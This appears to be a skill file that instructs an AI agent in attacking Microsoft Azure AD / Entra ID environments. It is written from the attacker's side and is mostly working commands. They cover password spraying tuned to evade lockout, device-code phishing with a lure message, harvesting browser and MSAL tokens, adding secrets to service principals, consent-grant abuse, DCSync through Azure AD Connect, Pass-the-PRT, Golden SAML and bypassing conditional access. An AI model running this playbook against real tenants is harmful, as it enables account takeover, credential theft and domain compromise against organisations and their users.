---
name: azure-ad-attack
description: "Azure AD / Entra ID attack methodology. Use when the target uses a Microsoft 365/Azure cloud environment, you discover Azure AD authentication flows, or you obtain Azure credentials. Covers initial access (password spraying/phishing), token theft, Service Principal abuse, conditional access bypass, and cross-tenant attacks"
zh-signals: "Azure AD/Entra ID 攻击方法论，覆盖密码喷洒、令牌窃取与 Service Principal 滥用。信号:azure ad,entra id,password spray,token,service principal,云攻击"
when-to-use: >-
  Use when the target uses Microsoft 365/Azure, you find Azure AD authentication flows, or you
  obtain Azure credentials, to test initial access, token theft, and privilege escalation.
metadata:
  tags: "azure,entra,aad,microsoft365,token,service-principal,conditional-access,cloud-attack,Azure AD"
  category: "cloud"
  mitre_attack: "T1078.004,T1528,T1550.001,T1098.001"
---

# Azure AD / Entra ID Attack Methodology

> **Positioning**: From the attacker's perspective, exploit Azure AD trust relationships, token mechanics, and configuration flaws to achieve lateral movement and privilege escalation

## ⛔ Further Reading

- Detailed token theft and refresh attack flows → [references/token-attacks.md](references/token-attacks.md)
- Service Principal and app registration abuse → [references/app-abuse.md](references/app-abuse.md)

---

## Phase 1: Initial Access

### 1.1 Password Spray (Azure AD)

```bash
# MSOLSpray — Azure AD password spraying
python3 MSOLSpray.py --userlist users.txt --password 'Spring2024!' \
  --url https://login.microsoftonline.com

# Ruler — Exchange/O365 password spraying
ruler --domain target.com brute --users users.txt --passwords pass.txt

# Trevorspray — distributed spraying (bypasses Smart Lockout)
trevorspray --users users.txt --passwords passwords.txt \
  --url https://login.microsoftonline.com \
  --delay 30 --jitter 10

# ⛔ Azure AD Smart Lockout: 10 failures / 60s by default
# Strategy: 1-2 attempts per user, interval > 60s, use different IPs
```

### 1.2 Phishing (Device Code / Consent Grant)

```bash
# Device Code Phishing — no password entry required from the target
# 1. Obtain the device code
curl -X POST https://login.microsoftonline.com/common/oauth2/devicecode \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.microsoft.com"

# 2. Send the device code to the target (via a phishing email)
# "Please visit https://microsoft.com/devicelogin and enter the code: XXXXXXXXX"

# 3. After the target enters the code, the attacker obtains the token
curl -X POST https://login.microsoftonline.com/common/oauth2/token \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&code=DEVICE_CODE"
```

### 1.3 Token Extraction (Compromised Host)

```bash
# Extract Azure AD cookies/tokens from the browser
# Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
# Edge: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies

# Extract from the TokenCache
# Windows: %LOCALAPPDATA%\.IdentityService\msal.cache
# macOS: ~/Library/Group Containers/*.Office/MicrosoftRegistrationDB.reg

# Use AADInternals
Import-Module AADInternals
Get-AADIntAccessTokenForMSGraph  # obtain a Graph API token
```

## Phase 2: Enumeration and Information Gathering

```bash
# AzureHound — the Azure version of BloodHound
azurehound list -u user@target.com -p 'password' --tenant target.onmicrosoft.com -o output.json

# ROADtools — full Azure AD enumeration
roadrecon auth -u user@target.com -p 'password'
roadrecon gather
roadrecon gui  # browse the results in the web UI

# Microsoft Graph API enumeration
# User list
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users?\$select=displayName,userPrincipalName,accountEnabled"

# Group members
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/groups?\$filter=displayName eq 'Global Admins'&\$expand=members"

# App registrations
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/applications"

# Service Principals
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals"
```

## Phase 3: Privilege Escalation

### 3.1 Service Principal Key Addition

```bash
# If you have permission to add credentials to an Application
# Application.ReadWrite.All, or ownership of the Application

# Add a password credential
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/applications/{app-id}/addPassword" \
  -d '{"passwordCredential":{"displayName":"backup"}}'

# Log in as the Service Principal with the new password
curl -X POST "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token" \
  -d "client_id={app-id}&client_secret={new-secret}&scope=https://graph.microsoft.com/.default&grant_type=client_credentials"
```

### 3.2 Consent Grant Attack

```bash
# Create a malicious app → trick an administrator into granting high privileges
# If you hold the Application Administrator role:
# Grant admin consent directly to the app

# Check existing high-privilege apps
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/oauth2PermissionGrants?\$filter=consentType eq 'AllPrincipals'"
```

### 3.3 PIM (Privileged Identity Management) Activation

```bash
# If the user has an eligible role but has not activated it
# Use AADInternals or the Graph API to activate it

# List activatable roles
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/beta/roleManagement/directory/roleEligibilityScheduleRequests"
```

## Phase 4: Lateral Movement

### Azure → On-Premises

```
Azure AD Connect sync accounts:
├─ MSOL_<installationID> — holds DCSync rights in the domain
├─ Retrieve credentials from the Azure AD Connect configuration database
├─ Use AADInternals: Get-AADIntSyncCredentials
└─ Use those credentials to DCSync the entire domain

Pass-the-PRT (Primary Refresh Token):
├─ Extract the PRT from an Azure AD Joined device
├─ Use the PRT to access all Azure AD SSO resources
├─ Tools: ROADtoken, RequestAADRefreshToken
└─ Can bypass conditional access policies (trusted device)
```

### On-Premises → Azure

```
If you own the on-premises Azure AD Connect server:
├─ Extract MSOL credentials → change the password of any synced user
├─ Obtain the cloud administrator password through the ADSync database
└─ Golden SAML: control AD FS → forge the SAML token of any user
```

## Phase 5: Conditional Access Bypass

```
Common bypass methods:
├─ Device Code flow — some policies do not cover the device flow
├─ Legacy authentication — old protocols may not be constrained by CA
├─ Different Client ID — use a non-browser client (Azure CLI/PowerShell)
├─ Trusted Location abuse — if you access from an already trusted IP
└─ Compliant device spoofing — the device claim inside the PRT
```

## Tool Quick Reference

| Tool | Purpose |
|------|------|
| AzureHound | Azure AD attack path discovery |
| ROADtools | Full Azure AD enumeration |
| AADInternals | Azure AD exploitation framework |
| TokenTactics | Token manipulation and refresh |
| MSOLSpray | Password spraying |
| GraphRunner | Graph API interaction |
| Trevorspray | Distributed spraying |
